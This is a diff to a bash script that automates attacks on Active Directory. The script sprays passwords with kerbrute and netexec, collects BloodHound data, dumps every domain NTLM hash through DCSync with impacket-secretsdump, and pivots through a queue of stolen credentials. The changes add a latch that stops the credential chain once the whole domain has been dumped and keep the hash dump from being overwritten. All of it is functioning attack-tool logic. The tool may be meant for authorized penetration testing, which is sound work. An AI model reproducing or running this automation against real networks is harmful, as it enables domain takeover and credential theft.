@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.52.0"
+readonly VERSION="1.53.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -161,6 +161,9 @@ DCT=""              # authenticated-call target: FQDN under Kerberos, else IP
 HAVE_AUTH=0         # 1 once the CURRENT credential is validated
 IS_DC_ADMIN=0       # 1 when the CURRENT identity is local admin on the DC (Pwn3d!) →
                     # nothing left to escalate: go straight to DCSync, skip the rest
+DOMAIN_DUMPED=0     # 1 once ANY identity has successfully DCSync'd the full domain →
+                    # global latch: the entire domain is owned, so the pivot engine stops
+                    # walking the credential queue (there is nothing left to escalate to)
 SUDO_KEEPALIVE_PID=""
 # Service capabilities, decided from the port scan — drive which techniques run
 CAP_SMB=0; CAP_KERBEROS=0; CAP_LDAP=0; CAP_LDAPS=0; CAP_RPC=0; CAP_WINRM=0; CAP_ADWS=0; CAP_DNS=0
@@ -2210,6 +2213,10 @@ phase_bloodhound() {
 # ===========================================================================
 phase_dcsync() {
     [[ "$HAVE_AUTH" != "1" ]] && return
+    # Domain already dumped by an earlier identity → do NOT run again: a second
+    # secretsdump (for an account without replication rights) would overwrite the good
+    # secretsdump.txt with an error and zero out the summary counts.
+    [[ "$DOMAIN_DUMPED" == "1" ]] && { info "Domain already DCSync'd → skipping (dump preserved in secretsdump.txt)"; return; }
     section "PHASE 9 · DCSYNC / SECRETSDUMP — DOMAIN HASH DUMP"
     have impacket-secretsdump || { warn "impacket-secretsdump unavailable, skipping"; return; }
     local outf="$OUTDIR/secretsdump.txt"
@@ -2232,6 +2239,9 @@ phase_dcsync() {
     fi
 
     if grep -qE ':::' "$outf" 2>/dev/null; then
+        # Full domain compromised. Latch it globally so the pivot engine stops walking
+        # the credential queue and no later identity re-runs (and clobbers) this dump.
+        DOMAIN_DUMPED=1; IS_DC_ADMIN=1; OWNED_ADMIN["${USER,,}"]=1
         loot "★★★★★ DCSYNC SUCCESSFUL — ENTIRE DOMAIN NTLM HASHES DUMPED ★★★★★"
         ok "$(grep -cE ':::' "$outf") NTLM hashes dumped:"
         grep -E ':::' "$outf" | while read -r line; do
@@ -2274,6 +2284,7 @@ ingest_dcsync_output() {
         queue_cred "Administrator" "" "$admin_hash" "$via"
     fi
     grep -E ':::' "$OUTDIR/secretsdump.txt" | awk -F: '{print $4}' | sort -u >"$OUTDIR/ntlm_hashes.txt"
+    DOMAIN_DUMPED=1        # global latch: domain owned via this exploit → stop the chain
     return 0
 }
 
@@ -7892,6 +7903,8 @@ assess_current_credential() {
 process_queue() {
     local entry u p h
     while [[ ${#CRED_QUEUE[@]} -gt 0 ]]; do
+        # Whole domain already dumped → nothing left to escalate to; stop draining.
+        [[ "$DOMAIN_DUMPED" == "1" ]] && { info "Domain already owned (DCSync complete) → stopping credential chain"; break; }
         entry="${CRED_QUEUE[0]}"
         CRED_QUEUE=("${CRED_QUEUE[@]:1}")        # dequeue (FIFO)
         IFS='|' read -r u p h <<<"$entry"
